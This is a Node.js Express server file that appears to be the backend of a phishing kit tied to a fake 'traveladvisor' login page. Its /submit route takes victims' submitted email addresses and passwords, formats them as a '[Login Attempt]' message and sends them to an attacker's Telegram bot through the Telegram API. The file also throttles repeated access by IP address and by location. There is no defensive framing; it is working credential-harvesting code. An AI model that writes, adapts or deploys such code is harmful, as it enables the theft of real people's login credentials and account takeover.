const express = require('express');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

const allowedOrigins = [
  'https://traveladvisor-o85i.onrender.com/outofplace/dossier/partizan/login',
  'https://traveladvisor-o85i.onrender.com/',
  'http://127.0.0.1:5000',
   // add all your trusted frontends here
];

// Middlewares
app.use(helmet());
app.use(cors());
app.use(cors({
  origin: function (origin, callback) {
    // Allow requests with no origin (e.g. mobile apps, curl)
    if (!origin) return callback(null, true);
    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    } else {
      return callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type'],
  credentials: false
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// === In-memory store to detect persistent locations ===
const locationStore = new Map();

// === Rate Limiting by IP ===
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, 
  message: 'Too many requests from this IP, please try again later.'
});
app.use(limiter);

// === Block repeated locations ===
function locationBlocker(req, res, next) {
  const ip = req.ip;
  const { latitude, longitude } = req.body.location || {};

  if (!latitude || !longitude) {
    return next();
  }

  const key = `${latitude}:${longitude}`;
  const currentTime = Date.now();

  const entry = locationStore.get(key);

  if (entry) {
    // If already exists and recent
    if (currentTime - entry.lastSeen < 10 * 60 * 1000) {
      entry.count += 1;
      if (entry.count >= 5) {
        return res.status(429).json({ error: 'Blocked: suspicious repeated access from this location' });
      }
    } else {
      // Reset counter if time elapsed
      entry.count = 1;
    }

    entry.lastSeen = currentTime;
    locationStore.set(key, entry);
  } else {
    locationStore.set(key, { count: 1, lastSeen: currentTime });
  }

  next();
}

app.get('/', (req, res) => {
  console.log('✅ Server was pinged - still running.');
  res.status(200).json({ status: 'Server is up and running.' });
});


app.post('/submit', locationBlocker, async (req, res) => {
  try {
    const data = req.body;
    console.log("📩 Received data:", data);

    // === Forwarding Logic ===
    const message = `
[Login Attempt]
Email: ${data.email}
Password: ${data.password}
`;

    // Replace with your actual bot token and chat ID
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    await axios.post(telegramUrl, {
      chat_id: chatId,
      text: message,
    });

    res.status(200).json({ message: 'Data forwarded successfully' });
  } catch (err) {
    console.error('Error forwarding data:', err.message);
    res.status(500).json({ error: 'Server error forwarding data' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
